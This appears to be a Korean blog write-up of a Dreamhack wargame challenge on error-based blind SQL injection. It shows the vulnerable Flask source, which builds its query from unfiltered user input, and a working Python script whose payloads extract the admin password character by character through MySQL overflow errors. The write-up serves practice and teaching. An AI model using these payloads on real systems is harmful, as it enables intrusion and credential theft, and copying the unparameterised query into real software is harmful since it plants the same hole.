---
title: "[ Dreamhack ] error based sql injection"
date: 2023-03-27T13:59:39.240Z
categories: [Wargame, Dreamhack]
tags: ["dreamhack","web"]
---
![](/images/a51148e5-6e16-418b-9330-e4afc0569485-image.png)

![](/images/25316dc8-ff5a-4021-8725-60877ed28918-image.png)

<br>



## **문제 분석**

---

주어진 문제 소스코드이다.
```python
import os
from flask import Flask, request
from flask_mysqldb import MySQL

app = Flask(__name__)
app.config['MYSQL_HOST'] = os.environ.get('MYSQL_HOST', 'localhost')
app.config['MYSQL_USER'] = os.environ.get('MYSQL_USER', 'user')
app.config['MYSQL_PASSWORD'] = os.environ.get('MYSQL_PASSWORD', 'pass')
app.config['MYSQL_DB'] = os.environ.get('MYSQL_DB', 'users')
mysql = MySQL(app)

template ='''
<pre style="font-size:200%">SELECT * FROM user WHERE uid='{uid}';</pre><hr/>
<form>
    <input tyupe='text' name='uid' placeholder='uid'>
    <input type='submit' value='submit'>
</form>
'''
     
@app.route('/', methods=['POST', 'GET'])
def index():
    uid = request.args.get('uid')
    if uid:
        try:
            cur = mysql.connection.cursor()
            cur.execute(f"SELECT * FROM user WHERE uid='{uid}';")
            return template.format(uid=uid)
        except Exception as e:
            return str(e)
    else:
        return template


if __name__ == '__main__':
    app.run(host='0.0.0.0')


```

코드를 보면 sql injection 필터링이 전혀 없는 것을 알 수 있다.

<br>

<br>



##  **문제 풀이**

---
![](/images/93002b51-b6c7-40be-9d17-2968d5c2d8f0-image.png)

값을 아무거나 넣어보면 query문은 실행되지만 결과값은 보이지 않는다.

<br>

![](/images/b0b2f386-a302-421e-9e76-1e8616296a27-image.png)

하지만 싱글쿼터를 넣어보면 에러 메시지를 볼 수 있다. 따라서 error based blind sql injection을 해야한다.

<br>

<br>

## **Exploit code**

---
```python
import requests

address = 'http://host3.dreamhack.games:10771/'
def find_length():
	pw_len = 1
	while 1:
		url = f"{address}?uid=1' or if(length((select upw from user where uid='admin'))='{pw_len}',9e307*2,1);%23"
		res = requests.get(url)
		if "DOUBLE value is out of range" in res.text:
			print(f'[+] Password Length : {pw_len}')
			return pw_len
		pw_len += 1

def find_password(pw_len):
    answer = ''

    for i in range(1,pw_len+1):
        for j in range(48,123):
            if 58<=j<=64: continue
            if 91<=j<=96: continue
            url = f"{address}?uid=1' or if(uid='admin' and ord(substr(upw,{i},1))='{j}',9e307*2,1);%23"
            res = requests.get(url)
            if "DOUBLE value is out" in res.text:
                answer += chr(j)
                print(f'[+] Find Password : {answer}')
                break
    print(f'[+] Find Password : {answer}')

find_password(find_length())
```

